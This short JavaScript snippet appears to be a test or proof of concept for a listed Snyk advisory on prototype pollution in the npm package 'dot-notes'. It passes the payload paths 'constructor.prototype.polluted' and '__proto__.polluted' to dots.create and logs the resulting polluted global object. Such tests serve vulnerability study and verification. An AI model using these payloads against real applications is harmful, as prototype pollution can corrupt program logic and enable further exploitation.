// //https://snyk.io/vuln/SNYK-JS-DOTNOTES-598668
// test("prototype pollution in dot-notes", () => {
console.log({}.polluted);

  const dots = require("dot-notes");
  //dots.create({}, "__proto__.polluted", "yes");
  dots.create({}, "constructor.prototype.polluted", "yes");
  
console.log({}.polluted);
// });
